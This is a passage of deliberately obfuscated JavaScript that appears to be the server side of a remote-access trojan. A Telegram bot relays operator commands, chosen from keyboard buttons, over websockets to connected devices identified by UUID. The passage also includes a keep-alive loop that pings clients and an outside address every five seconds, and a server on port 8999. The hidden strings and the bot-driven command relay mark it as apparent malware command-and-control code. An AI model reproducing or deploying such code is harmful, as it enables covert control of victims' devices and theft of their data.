   if (_0xeb57x26 == _0xdc21[146]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[146])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[147]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[147])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[148]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[148])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[149]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[149])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[150]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[150])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[151]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[151])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[152]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[152])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[153]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[153])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[154]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[155] + _0xdc21[156], {
         reply_markup: {
            force_reply: true
         }
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[157]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[158] + _0xdc21[58], {
         reply_markup: {
            force_reply: true
         }
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[9]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[159] + _0xdc21[160], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[161]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[162] + _0xdc21[163], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[164]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[165] + _0xdc21[166], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[167]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[168] + _0xdc21[169], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[170]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[171] + _0xdc21[172], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   };
   if (_0xeb57x26 == _0xdc21[173]) {
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[174] + _0xdc21[175], {
         reply_markup: {
            force_reply: true
         },
         parse_mode: _0xdc21[17]
      });
      currentUuid = _0xeb57xe
   }
});
setInterval(function () {
   appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
      _0xeb57xd[_0xdc21[6]](_0xdc21[176])
   });
   try {
      axios[_0xdc21[7]](address)[_0xdc21[177]]((_0xeb57x27) => {
         return _0xdc21[3]
      })
   } catch (e) {}
}, 5000);
appServer[_0xdc21[180]](process[_0xdc21[179]][_0xdc21[178]] || 8999)
